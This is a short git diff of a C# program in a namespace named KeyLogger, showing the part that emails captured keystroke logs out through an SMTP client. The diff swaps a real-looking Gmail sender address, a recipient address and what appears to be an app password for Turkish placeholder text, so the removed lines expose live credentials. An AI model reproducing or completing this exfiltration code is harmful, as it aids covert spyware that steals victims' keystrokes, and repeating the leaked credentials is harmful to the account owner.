@@ -34,8 +34,8 @@ namespace KeyLogger
             try
             {
                 MailMessage mail = new MailMessage();
-                mail.From = new MailAddress("aliturk02006@gmail.com"); 
-                mail.To.Add("240542016@firat.edu.tr\r\n");    
+                mail.From = new MailAddress("gonderici mail"); 
+                mail.To.Add("alici mail");    
                 mail.Subject = "KL Log - " + DateTime.Now.ToString("HH:mm");
                 mail.Body = logData;
 
@@ -46,7 +46,7 @@ namespace KeyLogger
                 client.UseDefaultCredentials = false;
 
           
-                client.Credentials = new System.Net.NetworkCredential("aliturk02006@gmail.com", "sbsr egmh llro bdxh");
+                client.Credentials = new System.Net.NetworkCredential("gonderici mail", "gonderici mail sifre");
 
                 client.Send(mail);
             }
@@ -76,3 +76,4 @@ namespace KeyLogger
         }
     }
 }
+
